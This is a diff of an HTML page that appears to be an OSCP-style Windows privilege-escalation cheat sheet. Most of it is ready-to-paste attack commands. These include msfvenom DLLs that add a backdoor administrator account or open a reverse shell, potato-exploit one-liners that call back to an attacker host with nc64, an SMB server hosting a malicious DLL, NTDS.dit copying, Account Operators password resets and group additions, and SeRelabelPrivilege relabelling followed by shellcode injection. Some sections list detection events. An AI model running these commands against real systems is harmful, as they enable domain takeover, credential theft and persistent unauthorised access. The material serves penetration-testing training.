 msfvenom -p windows/x64/exec CMD="net user hacker P@ssw0rd1 /add &amp;&amp; net localgroup administrators hacker /add" -f dll -o cryptbase.dll</div>
             </div>
@@ -2977,7 +3151,7 @@ REM Also try: actionqueue.dll, dbgcore.dll, mscoree.dll (all loaded by sysprep.e
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">Start listener on Kali</div>
-              <div class="code-block green">nc -lvnp {{PORT}}</div>
+              <div class="code-block green">nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
@@ -3129,7 +3303,7 @@ $r = 0
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">GodPotato (best all-round)</div>
-              <div class="code-block green">.\GodPotato-NET4.exe -cmd "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+              <div class="code-block green">.\GodPotato-NET4.exe -cmd "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
@@ -3137,37 +3311,37 @@ $r = 0
             <div class="step-content">
               <div class="step-title">JuicyPotatoNG &mdash; if ONLY SeAssignPrimaryToken (no SeImpersonate), use -t u</div>
               <div class="code-block green">REM Both privileges present (normal case):
-.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"
+.\JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"
 REM SeAssignPrimaryToken ONLY (no SeImpersonate) -- force CreateProcessAsUser:
-.\JuicyPotatoNG.exe -t u -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+.\JuicyPotatoNG.exe -t u -p "C:\Windows\System32\cmd.exe" -a "/c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">3</div>
             <div class="step-content">
               <div class="step-title">PrintSpoofer (Spooler must be running)</div>
-              <div class="code-block green">.\PrintSpoofer64.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+              <div class="code-block green">.\PrintSpoofer64.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
               <div class="step-title">SigmaPotato (no Spooler; Win8&ndash;Win11 / Server 2012&ndash;2022)</div>
-              <div class="code-block green">.\SigmaPotato.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd"</div>
+              <div class="code-block green">.\SigmaPotato.exe "cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">5</div>
             <div class="step-content">
               <div class="step-title">SweetPotato EfsRpc (no Spooler)</div>
-              <div class="code-block green">.\SweetPotato.exe -e EfsRpc -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{PORT}} -e cmd"</div>
+              <div class="code-block green">.\SweetPotato.exe -e EfsRpc -p {{WPATH}}\nc64.exe -a "{{KALI_IP}} {{RPORT}} -e cmd"</div>
             </div>
           </div>
           <div class="step">
             <div class="step-num">6</div>
             <div class="step-content">
               <div class="step-title">FullPowers (if LOCAL/NETWORK SERVICE &mdash; run first)</div>
-              <div class="code-block green">.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd" -z</div>
+              <div class="code-block green">.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd" -z</div>
             </div>
           </div>
         </div>
@@ -3254,8 +3428,9 @@ diskshadow.exe /s C:\Temp\pwn.dsh</div>
             <div class="step-num">5</div>
             <div class="step-content">
               <div class="step-title">Copy NTDS.dit using SeBackupPrivilege cmdlets</div>
-              <div class="code-block purple">Import-Module .\SeBackupPrivilegeCmdLets.dll
-Import-Module .\SeBackupPrivilegeUtils.dll
+              <div class="code-block purple">Import-Module .\SeBackupPrivilegeUtils.dll
+Import-Module .\SeBackupPrivilegeCmdLets.dll
+REM ORDER MATTERS: Utils FIRST (provides base functions), CmdLets SECOND (depends on Utils)
 Copy-FileSeBackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
 reg save HKLM\SYSTEM C:\Temp\system</div>
             </div>
@@ -3322,6 +3497,10 @@ whoami /groups | findstr /i dns</div>
             <div class="step-content">
               <div class="step-title">Generate malicious DLL on Kali</div>
               <div class="code-block">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o evil.dll</div>
+              <div class="alert alert-red" style="margin-top:8px">
+                <span class="alert-icon">!</span>
+                <span><strong>CRITICAL: The DNS plugin DLL MUST export <code>DnsPluginInitialize()</code></strong> or dns.exe will crash and fail to load. Basic msfvenom <code>-f dll</code> output does NOT export this function — dns.exe will fail to initialize it. <strong>Best workaround for OSCP labs:</strong> Use a custom DLL wrapper that exports <code>DnsPluginInitialize</code> and launches the payload in a background thread, OR use the pre-built dnsplugin.dll from <a href="https://github.com/dim0x69/dns-exe-persistance" target="_blank" style="color:var(--teal)">github.com/dim0x69/dns-exe-persistance</a> (add user variant — no export needed for AddUser logic).<br><br><strong>Quick fix:</strong> Use the <code>--exec</code> trick:<br><code>msfvenom -p windows/x64/exec CMD="net user hacker P@ss123 /add && net localgroup administrators hacker /add" -f dll -o evil.dll</code><br>The <code>exec</code> payload runs in DllMain which fires on DLL_PROCESS_ATTACH — no export needed.</span>
+              </div>
             </div>
           </div>
           <div class="step">
@@ -3329,7 +3508,8 @@ whoami /groups | findstr /i dns</div>
             <div class="step-content">
               <div class="step-title">Start SMB server on Kali to host the DLL</div>
               <div class="code-block">impacket-smbserver share . -smb2support
-# DLL will be loaded from \\{{KALI_IP}}\share\evil.dll</div>
+REM DLL will be loaded from \\{{KALI_IP}}\share\evil.dll
+REM -smb2support is REQUIRED for Windows 10 / Server 2016+ (SMB1 is disabled by default)</div>
             </div>
           </div>
           <div class="step">
@@ -3574,6 +3754,188 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -OutFile C:\Temp\Explo
       </div>
     </div>
 
+    <!-- Account Operators -->
+    <div id="page-accountops" class="page">
+      <div class="page-header">
+        <div class="page-title">&#128101; Account Operators Group <span class="severity-badge sev-rare">RARE / HIGH</span></div>
+        <div class="page-sub">// MANAGE USERS + GROUPS &rarr; PASSWORD RESET / ADD TO GROUPS &rarr; DOMAIN ADMIN PATH</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Account Operators domain group members</div></div>
+        <div class="info-card"><div class="info-label">Permissions</div><div class="info-value">Create/modify/delete users and groups — EXCEPT protected groups (Domain Admins, etc.)</div></div>
+        <div class="info-card"><div class="info-label">Primary Attack</div><div class="info-value">Reset password of low-priv account → lateral movement OR add self to a high-priv group</div></div>
+        <div class="info-card"><div class="info-label">Result</div><div class="info-value">Domain Admin (via group add) or targeted lateral movement</div></div>
+      </div>
+      <div class="alert alert-red">
+        <span class="alert-icon">!</span>
+        <span><strong>Protected groups are off-limits:</strong> Account Operators cannot modify Domain Admins, Enterprise Admins, Schema Admins, Domain Controllers, Group Policy Creator Owners, or Read-only Domain Controllers. However, ANY other group is fair game — including Remote Desktop Users, Server Operators, DnsAdmins, Backup Operators, etc.</span>
+      </div>
+      <div class="section">
+        <div class="section-header">&#9889; Attack 1 &mdash; Add self to DnsAdmins → SYSTEM on DC</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Confirm Account Operators membership</div>
+              <div class="code-block">net localgroup "Account Operators"
+whoami /groups | findstr /i "Account Operators"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Find exploitable groups you can add yourself to</div>
+              <div class="code-block">REM List all domain groups (look for DnsAdmins, Server Operators, Backup Operators):
+net group /domain
+REM Check who is in DnsAdmins:
+net group DnsAdmins /domain</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Add yourself to DnsAdmins (then follow DnsAdmins → SYSTEM chain)</div>
+              <div class="code-block purple">net group DnsAdmins {{USER}} /add /domain
+REM Verify:
+net group DnsAdmins /domain | findstr {{USER}}
+REM Now follow the DnsAdmins → SYSTEM attack path (see DnsAdmins page)</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="section-header">&#9889; Attack 2 &mdash; Reset a Service Account Password → Lateral Movement</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Find service accounts (not in protected groups)</div>
+              <div class="code-block">REM List all domain users:
+net user /domain | findstr /i "svc\|service\|sql\|backup\|admin"
+REM Get details of target account:
+net user svc_backup /domain</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Reset password of target account (no old password needed as Account Operator)</div>
+              <div class="code-block purple">net user svc_backup P@ssw0rd123 /domain
+REM Or using PowerShell:
+Set-ADAccountPassword -Identity svc_backup -NewPassword (ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force) -Reset</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Log in as the service account → inherit its access</div>
+              <div class="code-block green">REM via PSRemoting:
+$cred = New-Object System.Management.Automation.PSCredential("{{DOMAIN}}\svc_backup", (ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force))
+Enter-PSSession -ComputerName {{TARGET}} -Credential $cred
+REM via Evil-WinRM:
+evil-winrm -i {{TARGET}} -u svc_backup -p P@ssw0rd123</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="section-header">&#9889; Attack 3 &mdash; Add new admin user directly</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Create new domain user and add to Remote Desktop Users / Server Operators</div>
+              <div class="code-block purple">net user hacker P@ssw0rd1 /add /domain
+net group "Remote Desktop Users" hacker /add /domain
+net group "Server Operators" hacker /add /domain
+REM Then RDP in and follow Server Operators → SYSTEM chain</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">Event 4727 — security-enabled global group created &bull; Event 4728 — member added to global security group &bull; Event 4738 — user account changed &bull; Event 4723/4724 — password reset by non-owner &bull; net.exe group modification commands &bull; Unusual Account Operators account performing group changes</div>
+      </div>
+    </div>
+
+    <!-- SeRelabelPrivilege -->
+    <div id="page-serelabel" class="page">
+      <div class="page-header">
+        <div class="page-title">&#127991; SeRelabelPrivilege <span class="severity-badge sev-gold">UNCOMMON</span></div>
+        <div class="page-sub">// CHANGE INTEGRITY LABELS → BYPASS MANDATORY INTEGRITY CONTROL → OWN HIGH-IL OBJECTS</div>
+      </div>
+      <div class="info-grid">
+        <div class="info-card"><div class="info-label">Who Has It</div><div class="info-value">Rarely delegated — some backup agents, specialized svc accounts</div></div>
+        <div class="info-card"><div class="info-label">Mechanism</div><div class="info-value">NtSetSecurityObject with LABEL_SECURITY_INFORMATION — change mandatory integrity label on any object</div></div>
+        <div class="info-card"><div class="info-label">Attack</div><div class="info-value">Lower-label high-priv file/process → gain write access → replace binary → escalate</div></div>
+        <div class="info-card"><div class="info-label">Research</div><div class="info-value">tiraniddo.dev (James Forshaw) — the definitive SeRelabelPrivilege analysis</div></div>
+      </div>
+      <div class="alert alert-gold">
+        <span class="alert-icon">&#9733;</span>
+        <span><strong>How it works:</strong> Windows Mandatory Integrity Control (MIC) normally prevents low-integrity processes from writing to high-integrity objects. SeRelabelPrivilege lets you call <code>SetKernelObjectSecurity</code> with <code>LABEL_SECURITY_INFORMATION</code> to change an object's integrity label — including setting it LOWER than your current level or HIGHER (if you have access). This lets you effectively own any process or file by lowering its label to your level.</span>
+      </div>
+      <div class="section">
+        <div class="section-header">&#9889; Attack &mdash; Relabel SYSTEM process to Low IL → Take ownership → Code injection</div>
+        <div class="section-body">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-content">
+              <div class="step-title">Download PrivFu SetIntegrityLevel tool</div>
+              <div class="code-block purple">REM PrivFu has SetIntegrityLevel utility — compile from source or use prebuilt:
+iwr http://{{KALI_IP}}:{{PORT}}/windows/SetIntegrityLevel.exe -o {{WPATH}}\sil.exe
+REM Source: github.com/daem0nc0re/PrivFu (look in TokenDuplicate or PrivilegedOperations folder)</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-content">
+              <div class="step-title">Verify SeRelabelPrivilege is present and enable if disabled</div>
+              <div class="code-block">whoami /priv | findstr SeRelabel
+REM If Disabled: run EnableAllTokenPrivs.ps1 first</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-content">
+              <div class="step-title">Relabel a SYSTEM process (e.g. spoolsv.exe) to Medium integrity</div>
+              <div class="code-block orange">REM Find PID of target SYSTEM process:
+Get-Process spoolsv | Select Id
+REM Relabel to Medium IL (SDDL label S-1-16-8192):
+.\sil.exe -pid &lt;PID&gt; -level Medium
+REM Now the SYSTEM process is accessible from your Medium IL token</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-content">
+              <div class="step-title">Inject shellcode into the relabeled SYSTEM process</div>
+              <div class="code-block green">REM Use any process injection technique — VirtualAllocEx + WriteProcessMemory + CreateRemoteThread:
+REM Target process is now Medium IL (same as your token) so injection succeeds
+REM Result: shellcode runs in SYSTEM context</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">5</div>
+            <div class="step-content">
+              <div class="step-title">Alternative: relabel a system file to lower IL → write to it</div>
+              <div class="code-block orange">REM Lower the integrity label on a system DLL (loaded by SYSTEM process):
+.\sil.exe -file "C:\Windows\System32\target.dll" -level Low
+REM Now you can write to it — place malicious DLL, trigger process restart → SYSTEM code exec</div>
+            </div>
+          </div>
+          <div class="alert alert-teal">
+            <span class="alert-icon">&#128279;</span>
+            <span>Research: <a href="https://www.tiraniddo.dev/2021/06/the-much-misunderstood.html" target="_blank">tiraniddo.dev — The Much Misunderstood SeRelabelPrivilege</a> | <a href="https://decoder.cloud/2024/05/30/abusing-the-serelabelprivilege/" target="_blank">decoder.cloud — Abusing SeRelabelPrivilege</a> | PrivFu: <a href="https://github.com/daem0nc0re/PrivFu" target="_blank">github.com/daem0nc0re/PrivFu</a></span>
+          </div>
+        </div>
+      </div>
+      <div class="detection-box">
+        <div class="detection-title">Detection</div>
+        <div style="font-family:'Share Tech Mono',monospace;font-size:11px;">SetKernelObjectSecurity with LABEL_SECURITY_INFORMATION &bull; Integrity label changes on SYSTEM processes &bull; Cross-integrity-level memory writes (Sysmon Event 8 — CreateRemoteThread) &bull; High-integrity process suddenly becoming accessible to Medium IL processes</div>
+      </div>
+    </div>
+
     <!-- FullPowers -->
     <div id="page-fullpowers" class="page">
       <div class="page-header">
@@ -3607,9 +3969,9 @@ iwr http://{{KALI_IP}}:{{PORT}}/windows/ExploitCapcom.exe -OutFile C:\Temp\Explo
               <div class="code-block green">REM Interactive -- spawns new cmd.exe with full default privileges:
 .\FullPowers.exe
 REM Non-interactive -- chain directly into potato (most common):
-.\FullPowers.exe -c ".\GodPotato-NET4.exe -cmd 'cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd'" -z
+.\FullPowers.exe -c ".\GodPotato-NET4.exe -cmd 'cmd /c {{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd'" -z
 REM Or: spawn reverse shell directly:
-.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{PORT}} -e cmd" -z
+.\FullPowers.exe -c "{{WPATH}}\nc64.exe {{KALI_IP}} {{RPORT}} -e cmd" -z
 REM Extended privilege set (may fail on NETWORK SERVICE):
 .\FullPowers.exe -x</div>
             </div>
@@ -4214,30 +4576,109 @@ document.querySelectorAll('.code-block').forEach(block => {
   block.appendChild(btn);
 });
 
-// Live variable substitution — reads values set in privesc.html (shared localStorage)
-(function applyVars() {
-  const VAR_MAP = {
-    'KALI_IP': localStorage.getItem('v-kali')   || '{{KALI_IP}}',
-    'PORT':    localStorage.getItem('v-port')    || '{{PORT}}',
-    'RPORT':   localStorage.getItem('v-rport')   || '{{RPORT}}',
-    'TARGET':  localStorage.getItem('v-target')  || '{{TARGET}}',
-    'USER':    localStorage.getItem('v-user')    || '{{USER}}',
-    'PASS':    localStorage.getItem('v-pass')    || '{{PASS}}',
-    'DOMAIN':  localStorage.getItem('v-domain')  || '{{DOMAIN}}',
-    'WPATH':   localStorage.getItem('v-wpath')   || '{{WPATH}}',
-    'LFILE':   localStorage.getItem('v-lfile')   || '{{LFILE}}',
-    'SVCBIN':  localStorage.getItem('v-svcbin')  || '{{SVCBIN}}',
-    'SVCDIR':  localStorage.getItem('v-svcdir')  || '{{SVCDIR}}',
-    'TASKBIN': localStorage.getItem('v-taskbin') || '{{TASKBIN}}',
+// ── Variable bar — persist inputs in localStorage, auto-compute RPORT = PORT-1 ──
+const VI = {
+  kali:  document.getElementById('vi-kali'),
+  port:  document.getElementById('vi-port'),
+  rport: document.getElementById('vi-rport'),
+  target:document.getElementById('vi-target'),
+  user:  document.getElementById('vi-user'),
+  pass:  document.getElementById('vi-pass'),
+  wpath: document.getElementById('vi-wpath'),
+};
+
+// Track whether RPORT was manually edited
+let rportManual = false;
+
+// Restore saved values from localStorage (own inputs take priority over privesc.html shared storage)
+(function restoreInputs() {
+  const saved = {
+    kali:  localStorage.getItem('v-kali'),
+    port:  localStorage.getItem('v-port'),
+    rport: localStorage.getItem('v-rport'),
+    target:localStorage.getItem('v-target'),
+    user:  localStorage.getItem('v-user'),
+    pass:  localStorage.getItem('v-pass'),
+    wpath: localStorage.getItem('v-wpath'),
   };
+  Object.entries(saved).forEach(([k, v]) => { if (v && VI[k]) VI[k].value = v; });
+  // If rport was explicitly stored, mark as manual
+  if (saved.rport) rportManual = true;
+  // Style RPORT based on auto/manual state
+  if (VI.rport) VI.rport.classList.toggle('rport-auto', !rportManual);
+})();
+
+// PORT input → auto-compute RPORT = PORT - 1
+VI.port.addEventListener('input', function() {
+  const p = parseInt(this.value);
+  if (!isNaN(p) && p > 1 && !rportManual) {
+    VI.rport.value = p - 1;
+    VI.rport.classList.add('rport-auto');
+    localStorage.setItem('v-rport', p - 1);
+  }
+  localStorage.setItem('v-port', this.value);
+  applyVars();
+});
+
+// RPORT manual edit — lock it from auto-compute
+VI.rport.addEventListener('input', function() {
+  rportManual = !!this.value;
+  VI.rport.classList.toggle('rport-auto', !rportManual);
+  localStorage.setItem('v-rport', this.value);
+  applyVars();
+});
+
+// Other inputs
+['kali','target','user','pass','wpath'].forEach(k => {
+  VI[k].addEventListener('input', function() {
+    localStorage.setItem('v-' + k, this.value);
+    applyVars();
+  });
+});
+
+// Store the original text of each code block for re-substitution
+document.querySelectorAll('.code-block, pre, code').forEach(el => {
+  if (!el.dataset.orig) el.dataset.orig = el.innerHTML;
+});
+
+// Live variable substitution
+function applyVars() {
+  const portVal = VI.port.value || localStorage.getItem('v-port') || '';
+  let rportVal = VI.rport.value || localStorage.getItem('v-rport') || '';
+  // Auto-compute if blank
+  if (!rportVal && portVal && parseInt(portVal) > 1) {
+    rportVal = parseInt(portVal) - 1;
+    VI.rport.value = rportVal;
+    VI.rport.classList.add('rport-auto');
+    localStorage.setItem('v-rport', rportVal);
+  }
+
+  const VAR_MAP = {
+    'KALI_IP': VI.kali.value   || localStorage.getItem('v-kali')   || '',
+    'PORT':    portVal,
+    'RPORT':   String(rportVal),
+    'TARGET':  VI.target.value || localStorage.getItem('v-target') || '',
+    'USER':    VI.user.value   || localStorage.getItem('v-user')   || '',
+    'PASS':    VI.pass.value   || localStorage.getItem('v-pass')   || '',
+    'DOMAIN':  localStorage.getItem('v-domain')  || '',
+    'WPATH':   VI.wpath.value  || localStorage.getItem('v-wpath')  || '',
+    'LFILE':   localStorage.getItem('v-lfile')   || '',
+    'SVCBIN':  localStorage.getItem('v-svcbin')  || '',
+    'SVCDIR':  localStorage.getItem('v-svcdir')  || '',
+    'TASKBIN': localStorage.getItem('v-taskbin') || '',
+  };
+
   document.querySelectorAll('.code-block, pre, code').forEach(el => {
-    let t = el.innerHTML;
+    let t = el.dataset.orig || el.innerHTML;
     Object.entries(VAR_MAP).forEach(([k, v]) => {
-      if (v && v !== '{{' + k + '}}') t = t.replaceAll('{{' + k + '}}', `<span class="var-highlight">${v}</span>`);
+      if (v) t = t.replaceAll('{{' + k + '}}', `<span class="var-highlight">${v}</span>`);
     });
     el.innerHTML = t;
   });
-})();
+}
+
+// Initial render
+applyVars();
 </script>
 </body>
 </html>
